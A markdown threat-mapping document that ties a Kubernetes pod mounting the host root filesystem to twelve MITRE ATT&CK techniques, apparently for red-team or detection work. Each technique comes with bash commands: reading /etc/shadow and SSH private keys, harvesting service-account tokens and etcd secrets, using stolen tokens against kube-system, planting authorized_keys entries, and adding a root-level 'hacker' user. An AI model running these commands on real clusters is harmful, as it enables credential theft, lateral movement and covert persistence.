# MITRE ATT&CK Mapping: HostPath Pod

## Attack Flow

```
Initial Access → Execution → Discovery → Credential Access → 
Lateral Movement → Collection → Persistence
```

---

## MITRE ATT&CK Techniques

### 1. Initial Access

#### T1078 - Valid Accounts
**Behavior:** Attacker uses compromised Kubernetes credentials

**Procedures:**
```bash
kubectl apply -f hostpath-exec-pod.yaml
```

---

### 2. Execution

#### T1609 - Container Administration Command
**Behavior:** Execute commands in container via kubectl exec

**Procedures:**
```bash
kubectl exec -it hostpath-exec-pod -- bash
```

#### T1059.004 - Command and Scripting Interpreter: Unix Shell
**Behavior:** Execute bash commands to access mounted host filesystem

**Procedures:**
```bash
cd /host
find / -name kubeconfig
cat /etc/shadow
```

---

### 3. Discovery

#### T1083 - File and Directory Discovery
**Behavior:** Search for sensitive files on mounted host filesystem

**Procedures:**
```bash
find /host -name kubeconfig
find /host -name .kube
grep -R "current-context" /host/home/
grep -R "current-context" /host/root/
```

#### T1613 - Container and Resource Discovery
**Behavior:** Search for service account tokens

**Procedures:**
```bash
find /host/var/lib/kubelet/pods/ -name token
```

---

### 4. Credential Access

#### T1552.001 - Unsecured Credentials: Credentials In Files
**Behavior:** Access credentials from mounted host filesystem

**Service Account Tokens:**
```bash
find /host/var/lib/kubelet/pods/ -name token
cat /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token
```

**Kubeconfig Files:**
```bash
find /host -name kubeconfig
find /host -name .kube
grep -R "current-context" /host/home/
```

**etcd Secrets (Control-Plane Node):**
```bash
strings /host/var/lib/etcd/member/snap/db
```

**SSH Keys:**
```bash
cat /host/root/.ssh/id_rsa
cat /host/home/*/.ssh/id_rsa
```

#### T1555 - Credentials from Password Stores
**Behavior:** Extract secrets from etcd database

**Procedures:**
```bash
strings /host/var/lib/etcd/member/snap/db | grep eyJhbGciOiJ
```

---

### 5. Lateral Movement

#### T1021.007 - Remote Services: Cloud Services
**Behavior:** Use stolen tokens to access Kubernetes API

**Procedures:**
```bash
kubectl --token=$STOLEN_TOKEN get secrets -n kube-system
kubectl --token=$STOLEN_TOKEN create pod malicious-pod -n kube-system
```

---

### 6. Collection

#### T1005 - Data from Local System
**Behavior:** Access and collect data from host filesystem

**Procedures:**
```bash
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa
strings /host/var/lib/etcd/member/snap/db
find /host/var/lib/kubelet/pods/ -name token
```

#### T1530 - Data from Cloud Storage Object
**Behavior:** Extract secrets from etcd

**Procedures:**
```bash
strings /host/var/lib/etcd/member/snap/db
```

---

### 7. Persistence

#### T1098 - Account Manipulation
**Behavior:** Add SSH keys for persistent access

**Procedures:**
```bash
echo "ssh-rsa AAAA..." >> /host/root/.ssh/authorized_keys
echo "ssh-rsa AAAA..." >> /host/home/admin/.ssh/authorized_keys
```

#### T1136 - Create Account
**Behavior:** Create new user on host system

**Procedures:**
```bash
# Add new user via /etc/passwd and /etc/shadow
echo "hacker:x:0:0::/root:/bin/bash" >> /host/etc/passwd
```

---

## Technique Summary

| Tactic | Technique ID | Technique Name |
|--------|-------------|----------------|
| Initial Access | T1078 | Valid Accounts |
| Execution | T1609 | Container Administration Command |
| Execution | T1059.004 | Unix Shell |
| Discovery | T1083 | File and Directory Discovery |
| Discovery | T1613 | Container and Resource Discovery |
| Credential Access | T1552.001 | Credentials In Files |
| Credential Access | T1555 | Credentials from Password Stores |
| Lateral Movement | T1021.007 | Cloud Services |
| Collection | T1005 | Data from Local System |
| Collection | T1530 | Data from Cloud Storage |
| Persistence | T1098 | Account Manipulation |
| Persistence | T1136 | Create Account |

**Total: 12 Techniques across 7 Tactics**

**Pod Configuration:**
```yaml
spec:
  containers:
  - volumeMounts:
    - mountPath: /host
      name: noderoot
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

**Key Features:**
- Read/write access to entire host filesystem
- No privileged required
- Simpler than container escape but powerful
